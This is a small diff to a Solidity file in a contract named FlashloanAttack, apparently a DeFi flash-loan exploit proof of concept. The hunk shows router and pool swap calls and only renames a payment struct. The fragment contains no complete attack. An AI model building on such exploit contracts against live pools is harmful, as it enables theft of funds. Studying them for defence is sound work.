@@ -32,7 +32,7 @@ contract FlashloanAttack {
     ISwapRouter(ROUTER).exactInputSingle(params);
     IPool(POOL).swap(
       SwapParam(sideIn, sideOut, maturity, helper, payload),
-      SwapPayment(msg.sender, payer, recipient)
+      Payment(msg.sender, payer, recipient)
     );
   }
 
